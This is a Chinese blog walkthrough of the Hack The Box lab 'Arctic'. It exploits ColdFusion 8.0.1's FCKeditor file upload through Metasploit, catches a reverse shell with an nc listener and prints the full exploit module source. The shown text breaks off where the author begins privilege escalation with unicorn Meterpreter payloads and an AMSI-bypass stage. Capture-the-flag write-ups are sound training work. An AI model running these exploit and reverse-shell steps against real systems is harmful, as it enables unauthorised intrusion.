<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Arctic - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Arctic靶场信息                                                                                                            靶场类型">
<meta property="og:type" content="article">
<meta property="og:title" content="Arctic - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Arctic靶场信息                                                                                                            靶场类型">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/e4c1173f-3f4c-4a90-9a78-925d46e5b127.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/6274ec95-fd32-4351-9439-13c674bfa6f5.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/a1247cf5-7e0f-4a6e-82e3-8c4f4abd5102.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/6cd23f50-5a56-4ac7-87d9-5fa71e3d635c.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/1a24309f-23cb-4d09-bcf4-395cfa114edd.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/7a23b53c-79ef-4988-9a40-5ffc890ffc0c.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/7aee663c-0163-4649-9031-826e2759afd8.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/cb25197d-5eba-4baa-a0bb-daede99eefc4.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/ff248858-b98f-49b8-9b4d-03613178cf7f.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/4b654c17-bc7a-4166-adc6-1ab740912926.png">
<meta property="og:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/37fc7ada-a333-4ba2-bed0-632eeacb8147.png">
<meta property="article:published_time" content="2022-03-25T11:38:36.000Z">
<meta property="article:modified_time" content="2023-05-19T11:46:48.263Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/25/Hackthebox%20-%20Arctic/e4c1173f-3f4c-4a90-9a78-925d46e5b127.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Arctic - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Arctic - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2022-03-25T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2022-03-25
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Arctic"><span class="post-toc-text">Hackthebox - Arctic</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HTTP"><span class="post-toc-text">HTTP</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SearchSploit"><span class="post-toc-text">SearchSploit</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Msfconsole"><span class="post-toc-text">Msfconsole</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Msf-修复"><span class="post-toc-text">Msf 修复</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#失败的方法"><span class="post-toc-text">失败的方法</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#成功的方法"><span class="post-toc-text">成功的方法</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox - Arctic"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Arctic - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2022-03-25 19:38:36" datetime="2022-03-25T11:38:36.000Z"  itemprop="datePublished">2022-03-25</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Arctic"><a href="#Hackthebox-Arctic" class="headerlink" title="Hackthebox - Arctic"></a>Hackthebox - Arctic</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/e4c1173f-3f4c-4a90-9a78-925d46e5b127.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/6274ec95-fd32-4351-9439-13c674bfa6f5.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic]
└─# nmap -sC -sV -oA nmap 10.10.10.11                     
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-24 02:23 EDT
Nmap scan report for 10.10.10.11
Host is up (0.35s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 252.28 seconds
</code></pre>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>这里的 8500 是一个 HTTP 服务，打开后需要等待约 10-20 秒的时间来加载。这台靶机的翻译叫做北极，我想原因就是因为太慢了吧。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/a1247cf5-7e0f-4a6e-82e3-8c4f4abd5102.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/6cd23f50-5a56-4ac7-87d9-5fa71e3d635c.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>在 CFIDE 目录下有一个 administrator 目录，我们进去看看</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/1a24309f-23cb-4d09-bcf4-395cfa114edd.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后就会进入一个登录页面，赫然写着 ColdFusion 8，去 search 一下看看有没有相关的漏洞</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="SearchSploit"><a href="#SearchSploit" class="headerlink" title="SearchSploit"></a>SearchSploit</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Arctic]
└─# searchsploit ColdFusion 8
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                    |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - &#39;probe.cfm&#39; Cross-Site Scripting                                                                                                                               | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                                                            | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                                               | multiple/remote/16985.rb
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                                                       | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                                                     | multiple/webapps/45979.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass                                                                                                                         | windows/webapps/27755.txt
Adobe ColdFusion &lt; 11 Update 10 - XML External Entity Injection                                                                                                                   | multiple/webapps/40346.py
Adobe ColdFusion Server 8.0.1 - &#39;/administrator/enter.cfm&#39; Query String Cross-Site Scripting                                                                                      | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - &#39;/wizards/common/_authenticatewizarduser.cfm&#39; Query String Cross-Site Scripting                                                                   | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - &#39;/wizards/common/_logintowizard.cfm&#39; Query String Cross-Site Scripting                                                                            | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - &#39;administrator/logviewer/searchlog.cfm?startRow&#39; Cross-Site Scripting                                                                             | cfm/webapps/33168.txt
Allaire ColdFusion Server 4.0 - Remote File Display / Deletion / Upload / Execution                                                                                               | multiple/remote/19093.txt
Allaire ColdFusion Server 4.0.1 - &#39;CFCRYPT.EXE&#39; Decrypt Pages                                                                                                                     | windows/local/19220.c
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit)                                                                                                                 | cfm/webapps/16788.rb
ColdFusion 9-10 - Credential Disclosure                                                                                                                                           | multiple/webapps/25305.py
ColdFusion MX - Missing Template Cross-Site Scripting                                                                                                                             | cfm/remote/21548.txt
ColdFusion Scripts Red_Reservations - Database Disclosure                                                                                                                         | asp/webapps/7440.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                                                                                         | multiple/remote/22867.pl
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
</code></pre>
<p>ColdFusion 8.0.1 - Arbitrary File Upload &#x2F; Execution (Metasploit)</p>
<p>这条显示有一个文件上传，并且有 MSF 脚本，去运行试试</p>
<h2 id="Msfconsole"><a href="#Msfconsole" class="headerlink" title="Msfconsole"></a>Msfconsole</h2><pre><code class="bash">msf6 &gt; search ColdFusion

Matching Modules
================

   #  Name                                                           Disclosure Date  Rank       Check  Description
   -  ----                                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/coldfusion_ckeditor_file_upload             2018-09-11       excellent  No     Adobe ColdFusion CKEditor unrestricted file upload
   1  exploit/multi/http/coldfusion_rds_auth_bypass                  2013-08-08       great      Yes    Adobe ColdFusion RDS Authentication Bypass
   2  auxiliary/scanner/http/adobe_xml_inject                                         normal     No     Adobe XML External Entity Injection
   3  auxiliary/gather/coldfusion_pwd_props                          2013-05-07       normal     Yes    ColdFusion &#39;password.properties&#39; Hash Extraction
   4  exploit/windows/http/coldfusion_fckeditor                      2009-07-03       excellent  No     ColdFusion 8.0.1 Arbitrary File Upload and Execute
   5  auxiliary/scanner/http/coldfusion_locale_traversal                              normal     No     ColdFusion Server Check
   6  auxiliary/scanner/http/coldfusion_version                                       normal     No     ColdFusion Version Scanner
   7  exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce  2016-03-28       excellent  Yes    HID discoveryd command_blink_on Unauthenticated RCE

Interact with a module by name or index. For example info 7, use 7 or use exploit/linux/misc/hid_discoveryd_command_blink_on_unauth_rce
</code></pre>
<p>直接使用第一个 然后尝试是否可以成功</p>
<pre><code class="bash">msf6 &gt; use 4
[*] No payload configured, defaulting to generic/shell_reverse_tcp
msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set payload generic/shell_reverse_tcp
payload =&gt; generic/shell_reverse_tcp
</code></pre>
<p>使用相关的模块，并且设置好攻击模块</p>
<pre><code class="bash">msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show options 

Module options (exploit/windows/http/coldfusion_fckeditor):

   Name           Current Setting                                                             Required  Description
   ----           ---------------                                                             --------  -----------
   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm
   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT          80                                                                          yes       The target port (TCP)
   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                                                      no        HTTP server virtual host

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.200.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Universal Windows Target
</code></pre>
<p>这是需要设置的参数</p>
<pre><code class="bash">msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set rhosts 10.10.10.11
rhosts =&gt; 10.10.10.11
msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set rport 8500
rport =&gt; 8500
msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set lhost 10.10.16.4
lhost =&gt; 10.10.16.4
msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show options 

Module options (exploit/windows/http/coldfusion_fckeditor):

   Name           Current Setting                                                             Required  Description
   ----           ---------------                                                             --------  -----------
   FCKEDITOR_DIR  /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm  no        The path to upload.cfm
   Proxies                                                                                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.11                                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
   RPORT          8500                                                                        yes       The target port (TCP)
   SSL            false                                                                       no        Negotiate SSL/TLS for outgoing connections
   VHOST                                                                                      no        HTTP server virtual host

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.4       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Universal Windows Target
</code></pre>
<p>设置好相关的参数后，exploit 执行</p>
<pre><code class="bash">msf6 exploit(windows/http/coldfusion_fckeditor) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
</code></pre>
<p>这个 exploit 在执行后几乎就秒失败了，这是有问题的，因为这个网站不管执行什么，都应该有个大约 30 秒左右的缓冲，我们检查一下原因</p>
<pre><code class="bash">msf6 exploit(windows/http/coldfusion_fckeditor) &gt; show advanced 

Module advanced options (exploit/windows/http/coldfusion_fckeditor):

   Name                    Current Setting                                     Required  Description
   ----                    ---------------                                     --------  -----------
   ContextInformationFile                                                      no        The information file that contains context information
   DOMAIN                  WORKSTATION                                         yes       The domain to use for Windows authentication
   DigestAuthIIS           true                                                no        Conform to IIS, should work for most servers. Only set to false for non-IIS servers
   DisablePayloadHandler   false                                               no        Disable the handler code for the selected payload
   EnableContextEncoding   false                                               no        Use transient context when encoding payloads
   FingerprintCheck        true                                                no        Conduct a pre-exploit fingerprint verification
   HttpClientTimeout                                                           no        HTTP connection and receive timeout
   HttpPassword                                                                no        The HTTP password to specify for authentication
   HttpRawHeaders                                                              no        Path to ERB-templatized raw headers to append to existing headers
   HttpTrace               false                                               no        Show the raw HTTP requests and responses
   HttpTraceColors         red/blu                                             no        HTTP request and response colors for HttpTrace (unset to disable)
   HttpTraceHeadersOnly    false                                               no        Show HTTP headers only in HttpTrace
   HttpUsername                                                                no        The HTTP username to specify for authentication
   SSLVersion              Auto                                                yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS
                                                                                         1, TLS1.1, TLS1.2)
   UserAgent               Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  no        The User-Agent header to use for all requests
   VERBOSE                 false                                               no        Enable detailed status messages
   WORKSPACE                                                                   no        Specify the workspace for this module
   WfsDelay                2                                                   no        Additional delay in seconds to wait for a session

Payload advanced options (generic/shell_reverse_tcp):

   Name                        Current Setting  Required  Description
   ----                        ---------------  --------  -----------
   ARCH                                         no        The architecture that is being targeted
   PLATFORM                                     no        The platform that is being targeted
   ReverseAllowProxy           false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
   ReverseListenerBindAddress                   no        The specific IP address to bind to on the local system
   ReverseListenerBindPort                      no        The port to bind to on the local system if different from LPORT
   ReverseListenerComm                          no        The specific communication channel to use for this listener
   ReverseListenerThreaded     false            yes       Handle every connection in a new thread (experimental)
   StagerRetryCount            10               no        The number of times the stager should retry if the first connect fails
   StagerRetryWait             5                no        Number of seconds to wait for the stager between reconnect attempts
   VERBOSE                     false            no        Enable detailed status messages
   WORKSPACE                                    no        Specify the workspace for this module
</code></pre>
<pre><code class="bash">msf6 exploit(windows/http/coldfusion_fckeditor) &gt; set VERBOSE TRUE
VERBOSE =&gt; true
</code></pre>
<p>我们将 VERBOSE 设置为 TRUE 然后再执行</p>
<pre><code class="bash">msf6 exploit(windows/http/coldfusion_fckeditor) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Sending our POST request...
[-] Upload Failed...
[*] Exploit completed, but no session was created.
</code></pre>
<p>然后执行后还是没有得到相关的信息，以及详细情况，我们抓个包看看内容</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/7a23b53c-79ef-4988-9a40-5ffc890ffc0c.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/7aee663c-0163-4649-9031-826e2759afd8.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>添加一个新的代理，设置端口为 8500，并将流量转发到 10.10.10.11的 8500 端口</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/cb25197d-5eba-4baa-a0bb-daede99eefc4.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>我们切换好代理，然后去执行</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/ff248858-b98f-49b8-9b4d-03613178cf7f.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>成功抓到了 payload 内容</p>
<p>我们发送到 repeater，然后执行</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/4b654c17-bc7a-4166-adc6-1ab740912926.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2022/03/25/Hackthebox%20-%20Arctic/37fc7ada-a333-4ba2-bed0-632eeacb8147.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>在下面可以看到，有一段命令是向我们的 ip 和端口回弹一个shell，但是被上面的 00 截断还是什么玩意儿的给截断了还是吧啦吧啦的，反正就是没执行成功，但是文件应该上去了。在本地使用 nc 监听一个端口，然后手动访问一下我们上传的文件</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nc -nvlp 4444
listening on [any] 4444 ...
</code></pre>
<pre><code class="bash">http://10.10.10.11:8500/userfiles/file/MMJPPXXEPA.jsp
</code></pre>
<p>然后等待 30 秒</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.11] 49440
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin&gt;whoami
whoami
arctic\tolis
</code></pre>
<p>成功拿到一个 shell</p>
<pre><code class="bash">C:\Users\tolis\Desktop&gt;cd C:\Users\tolis\Desktop
cd C:\Users\tolis\Desktop

C:\Users\tolis\Desktop&gt;type user.txt
type user.txt
b30ff1922f046d55ccb4b125ea8f1539
</code></pre>
<p>成功拿到一个 user 权限的 flag 文件</p>
<h3 id="Msf-修复"><a href="#Msf-修复" class="headerlink" title="Msf 修复"></a>Msf 修复</h3><p>查找一下 windows&#x2F;http&#x2F;coldfusion_fckeditor 的地址</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# locate windows/http/coldfusion_fckeditor                                                                                                                                                                    1 ⨯
/usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb
</code></pre>
<p>查看一下</p>
<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
└─# cat /usr/share/metasploit-framework/modules/exploits/windows/http/coldfusion_fckeditor.rb
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#39;Name&#39;           =&gt; &#39;ColdFusion 8.0.1 Arbitrary File Upload and Execute&#39;,
      &#39;Description&#39;    =&gt; %q{
          This module exploits the Adobe ColdFusion 8.0.1 FCKeditor &#39;CurrentFolder&#39; File Upload
        and Execute vulnerability.
      },
      &#39;Author&#39;         =&gt; [ &#39;MC&#39; ],
      &#39;License&#39;        =&gt; MSF_LICENSE,
      &#39;Platform&#39;       =&gt; &#39;win&#39;,
      &#39;Privileged&#39;     =&gt; true,
      &#39;References&#39;     =&gt;
        [
          [ &#39;CVE&#39;, &#39;2009-2265&#39; ],
          [ &#39;OSVDB&#39;, &#39;55684&#39;],
        ],
      &#39;Targets&#39;        =&gt;
        [
          [ &#39;Universal Windows Target&#39;,
            {
              &#39;Arch&#39;     =&gt; ARCH_JAVA,
              &#39;Payload&#39;  =&gt;
                {
                  &#39;DisableNops&#39; =&gt; true,
                },
            }
          ],
        ],
      &#39;DefaultOptions&#39; =&gt;
        {
          &#39;SHELL&#39; =&gt; &#39;cmd.exe&#39;
        },
      &#39;DefaultTarget&#39;  =&gt; 0,
      &#39;DisclosureDate&#39; =&gt; &#39;2009-07-03&#39;
    ))

    register_options(
      [
        OptString.new(&#39;FCKEDITOR_DIR&#39;, [ false, &#39;The path to upload.cfm &#39;, &#39;/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm&#39; ]),
      ])
  end

  def exploit

    page  = rand_text_alpha_upper(rand(10) + 1) + &quot;.jsp&quot;

    dbl = Rex::MIME::Message.new
    dbl.add_part(payload.encoded, &quot;application/x-java-archive&quot;, nil, &quot;form-data; name=\&quot;newfile\&quot;; filename=\&quot;#{rand_text_alpha_upper(8)}.txt\&quot;&quot;)
    file = dbl.to_s
    file.strip!

    print_status(&quot;Sending our POST request...&quot;)

    res = send_request_cgi(
      {
        &#39;uri&#39;           =&gt; normalize_uri(datastore[&#39;FCKEDITOR_DIR&#39;]),
        &#39;query&#39;         =&gt; &quot;Command=FileUpload&amp;Type=File&amp;CurrentFolder=/#{page}%00&quot;,
        &#39;version&#39;       =&gt; &#39;1.1&#39;,
        &#39;method&#39;        =&gt; &#39;POST&#39;,
        &#39;ctype&#39;         =&gt; &#39;multipart/form-data; boundary=&#39; + dbl.bound,
        &#39;data&#39;          =&gt; file,
      }, 5)

    if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )
      print_status(&quot;Upload succeeded! Executing payload...&quot;)

      send_request_raw(
        {
          # default path in Adobe ColdFusion 8.0.1.
          &#39;uri&#39;         =&gt; &#39;/userfiles/file/&#39; + page,
          &#39;method&#39;      =&gt; &#39;GET&#39;,
        }, 5)

      handler
    else
      print_error(&quot;Upload Failed...&quot;)
      return
    end

  end
end
</code></pre>
<p>这里将 74 行和 84 行的等待 5 秒更换为等待 25 秒即可成功使用</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="失败的方法"><a href="#失败的方法" class="headerlink" title="失败的方法"></a>失败的方法</h2><blockquote>
<p><a href="https://github.com/trustedsec/unicorn" target="_blank" rel="noopener">https://github.com/trustedsec/unicorn</a></p>
</blockquote>
<p>这里使用 unicorn 工具反向一个 Meterpreter 的 shell 回来</p>
<p>使用 unicorn 生成一下</p>
<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]
└─# ./unicorn.py windows/meterpreter/reverse_tcp 10.10.16.4 5555
</code></pre>
<p>然后会生成两个文件</p>
<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]
└─# cat unicorn.rc 
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.16.4
set LPORT 5555
set ExitOnSession false
set AutoVerifySession false
set AutoSystemInfo false
set AutoLoadStdapi false
exploit -j
</code></pre>
<p>一个是加载监听器的所有命令</p>
<pre><code class="bash">┌──(root💀kali)-[~/…/HTB/Easy/Arctic/unicorn]
└─# cat powershell_attack.txt 
# AMSI bypass code - run in same process as unicorn second stage
